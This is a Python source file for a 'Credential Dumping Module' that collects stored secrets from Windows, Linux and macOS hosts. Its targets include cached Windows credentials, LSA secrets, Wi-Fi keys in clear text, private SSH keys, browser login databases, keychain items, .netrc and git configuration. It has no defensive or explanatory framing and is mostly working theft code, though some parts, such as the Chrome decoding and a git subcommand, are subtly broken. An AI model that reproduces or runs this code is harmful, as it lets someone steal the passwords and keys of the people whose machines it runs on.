# Credential Dumping Module
import platform
import os
import json
import base64
import sqlite3
import glob
from pathlib import Path

class CredentialDumper:
    def __init__(self):
        self.system = platform.system()
        self.credentials = []
        
    def dump_all(self):
        """Dump all available credentials"""
        results = {
            "system": self.system,
            "credentials": {}
        }
        
        # Platform-specific dumps
        if self.system == "Windows":
            results["credentials"]["mimikatz"] = self.dump_mimikatz()
            results["credentials"]["wifi"] = self.dump_wifi_passwords()
            results["credentials"]["browser"] = self.dump_browser_passwords()
            results["credentials"]["registry"] = self.dump_registry_creds()
        elif self.system == "Linux":
            results["credentials"]["ssh"] = self.dump_ssh_keys()
            results["credentials"]["wifi"] = self.dump_wifi_linux()
            results["credentials"]["browser"] = self.dump_browser_passwords()
            results["credentials"]["netrc"] = self.dump_netrc()
            results["credentials"]["git"] = self.dump_git_creds()
        elif self.system == "Darwin":
            results["credentials"]["keychain"] = self.dump_keychain()
            results["credentials"]["ssh"] = self.dump_ssh_keys()
            results["credentials"]["wifi"] = self.dump_wifi_mac()
            results["credentials"]["browser"] = self.dump_browser_passwords()
        
        return results
    
    def dump_mimikatz(self):
        """Dump Windows credentials (Mimikatz-style)"""
        try:
            import subprocess
            
            # Try to get passwords from various sources
            creds = []
            
            # Check for cached credentials
            try:
                result = subprocess.run(
                    ['cmdkey', '/list'],
                    capture_output=True, text=True, timeout=10
                )
                if result.stdout:
                    creds.append({"source": "cmdkey", "data": result.stdout[:2000]})
            except:
                pass
            
            # Check LSA secrets (requires admin)
            try:
                result = subprocess.run(
                    ['reg', 'query', 'HKLM\\SECURITY\\Policy\\Secrets'],
                    capture_output=True, text=True, timeout=10
                )
                if result.stdout:
                    creds.append({"source": "LSA", "data": result.stdout[:2000]})
            except:
                pass
            
            return {"success": True, "credentials": creds}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def dump_wifi_passwords(self):
        """Dump saved WiFi passwords (Windows)"""
        try:
            import subprocess
            
            wifi_creds = []
            
            # Get all WiFi profiles
            result = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'],
                capture_output=True, text=True
            )
            
            profiles = []
            for line in result.stdout.split('\n'):
                if 'All User Profile' in line:
                    profile = line.split(':')[-1].strip()
                    profiles.append(profile)
            
            # Get passwords for each profile
            for profile in profiles[:20]:  # Limit to 20
                try:
                    result = subprocess.run(
                        ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                        capture_output=True, text=True
                    )
                    for line in result.stdout.split('\n'):
                        if 'Key Content' in line:
                            password = line.split(':')[-1].strip()
                            wifi_creds.append({
                                "ssid": profile,
                                "password": password
                            })
                            break
                except:
                    continue
            
            return {"success": True, "wifi_creds": wifi_creds}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def dump_wifi_linux(self):
        """Dump WiFi passwords on Linux"""
        try:
            wifi_creds = []
            
            # Check NetworkManager stored passwords
            nm_dir = "/etc/NetworkManager/system-connections/"
            if os.path.exists(nm_dir):
                for conn_file in glob.glob(f"{nm_dir}/*"):
                    try:
                        with open(conn_file, 'r') as f:
                            content = f.read()
                            ssid = Path(conn_file).name
                            for line in content.split('\n'):
                                if line.startswith('psk='):
                                    password = line.split('=')[1]
                                    wifi_creds.append({
                                        "ssid": ssid,
                                        "password": password
                                    })
                                    break
                    except:
                        continue
            
            return {"success": True, "wifi_creds": wifi_creds}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def dump_wifi_mac(self):
        """Dump WiFi passwords on macOS"""
        try:
            import subprocess
            
            wifi_creds = []
            
            # Get saved networks
            result = subprocess.run(
                ['networksetup', '-listpreferredwirelessnetworks', 'Wi-Fi'],
                capture_output=True, text=True
            )
            
            networks = [n.strip() for n in result.stdout.split('\n') if n.strip()]
            
            # Try to get passwords (requires keychain access)
            for network in networks[:10]:
                try:
                    result = subprocess.run(
                        ['security', 'find-generic-password', '-s', network, '-w'],
                        capture_output=True, text=True
                    )
                    if result.stdout:
                        wifi_creds.append({
                            "ssid": network,
                            "password": result.stdout.strip()
                        })
                except:
                    continue
            
            return {"success": True, "wifi_creds": wifi_creds}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def dump_ssh_keys(self):
        """Dump SSH keys"""
        try:
            ssh_keys = []
            home = Path.home()
            
            ssh_dir = home / ".ssh"
            if ssh_dir.exists():
                for key_file in ssh_dir.glob("*"):
                    if not key_file.is_dir() and not key_file.name.endswith('.pub'):
                        try:
                            with open(key_file, 'r') as f:
                                content = f.read()
                                ssh_keys.append({
                                    "file": str(key_file),
                                    "type": "private",
                                    "content": content[:500]
                                })
                        except:
                            pass
            
            return {"success": True, "ssh_keys": ssh_keys}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def dump_browser_passwords(self):
        """Dump saved browser passwords"""
        try:
            passwords = {
                "chrome": self.dump_chrome_passwords(),
                "firefox": self.dump_firefox_passwords(),
                "safari": self.dump_safari_passwords()
            }
            return {"success": True, "passwords": passwords}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def dump_chrome_passwords(self):
        """Dump Chrome/Chromium saved passwords"""
        try:
            home = Path.home()
            
            # Linux paths
            chrome_paths = [
                home / ".config" / "google-chrome" / "Default" / "Login Data",
                home / ".config" / "google-chrome-beta" / "Default" / "Login Data",
                home / ".config" / "chromium" / "Default" / "Login Data",
                home / ".config" / "BraveSoftware" / "Brave-Browser" / "Default" / "Login Data",
                # Windows paths
                Path(os.environ.get('APPDATA', '')) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data",
                # Mac paths
                home / "Library" / "Application Support" / "Google" / "Chrome" / "Default" / "Login Data",
            ]
            
            passwords = []
            
            for chrome_path in chrome_paths:
                if chrome_path.exists():
                    try:
                        # Copy and read database
                        import shutil
                        import tempfile
                        
                        with tempfile.NamedTemporaryFile() as tmp:
                            shutil.copy(chrome_path, tmp.name)
                            conn = sqlite3.connect(tmp.name)
                            cursor = conn.cursor()
                            
                            try:
                                cursor.execute('''
                                    SELECT origin_url, username_value, password_value 
                                    FROM logins 
                                    WHERE password_value IS NOT NULL
                                ''')
                                
                                for row in cursor.fetchall():
                                    passwords.append({
                                        "url": row[0],
                                        "username": row[1],
                                        "password": row[2].decode('utf-16') if row[2] else "encrypted"
                                    })
                            except:
                                pass
                    except:
                        pass
                    break
            
            return passwords
        except Exception as e:
            return []
    
    def dump_firefox_passwords(self):
        """Dump Firefox saved passwords"""
        try:
            home = Path.home()
            
            firefox_paths = [
                home / ".mozilla" / "firefox" / "*.default" / "logins.json",
                home / "Library" / "Application Support" / "Firefox" / "Profiles" / "*.default" / "logins.json",
            ]
            
            passwords = []
            
            for pattern in firefox_paths:
                for filepath in glob.glob(str(pattern)):
                    try:
                        with open(filepath, 'r') as f:
                            data = json.load(f)
                            for login in data.get('logins', []):
                                passwords.append({
                                    "url": login.get('hostname'),
                                    "username": login.get('username'),
                                    "password": "encrypted"  # Would need decryption key
                                })
                    except:
                        pass
            
            return passwords
        except Exception as e:
            return []
    
    def dump_safari_passwords(self):
        """Dump Safari saved passwords (macOS)"""
        try:
            if self.system != "Darwin":
                return []
            
            import subprocess
            
            passwords = []
            
            # Try to get passwords from keychain
            result = subprocess.run(
                ['security', 'find-internet-password', '-g', '-s', 'safari'],
                capture_output=True, text=True
            )
            
            if result.stdout:
                passwords.append({"source": "safari", "data": result.stdout[:2000]})
            
            return passwords
        except Exception as e:
            return []
    
    def dump_keychain(self):
        """Dump macOS Keychain items"""
        try:
            import subprocess
            
            items = []
            
            # List all keychain items
            result = subprocess.run(
                ['security', 'find-generic-password', '-a', '-w'],
                capture_output=True, text=True
            )
            
            if result.stdout:
                for line in result.stdout.split('\n'):
                    if line.strip():
                        items.append(line.strip())
            
            return {"success": True, "items": items[:50]}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def dump_netrc(self):
        """Dump .netrc file credentials"""
        try:
            home = Path.home()
            netrc_path = home / ".netrc"
            
            if netrc_path.exists():
                with open(netrc_path, 'r') as f:
                    return {"success": True, "content": f.read()[:2000]}
            
            return {"success": False, "message": ".netrc not found"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def dump_git_creds(self):
        """Dump Git credentials"""
        try:
            import subprocess
            
            creds = []
            
            # Get stored credentials
            result = subprocess.run(
                ['git', 'config', '--global', '--list'],
                capture_output=True, text=True
            )
            
            if result.stdout:
                creds.append({"source": "git-config", "data": result.stdout[:2000]})
            
            # Check credential helper
            result = subprocess.run(
                ['git', 'credential', 'list'],
                capture_output=True, text=True
            )
            
            if result.stdout:
                creds.append({"source": "git-credential", "data": result.stdout[:2000]})
            
            return {"success": True, "credentials": creds}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def dump_registry_creds(self):
        """Dump Windows Registry credentials"""
        try:
            import subprocess
            
            creds = []
            
            # Check common credential locations
            keys = [
                'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings',
                'HKCU\\Software\\Microsoft\\Office\\Common\\Internet',
            ]
            
            for key in keys:
                try:
                    result = subprocess.run(
                        ['reg', 'query', key],
                        capture_output=True, text=True
                    )
                    if result.stdout:
                        creds.append({"key": key, "data": result.stdout[:1000]})
                except:
                    continue
            
            return {"success": True, "credentials": creds}
        except Exception as e:
            return {"success": False, "error": str(e)}


def dump_credentials():
    """Quick credential dump function"""
    dumper = CredentialDumper()
    return dumper.dump_all()
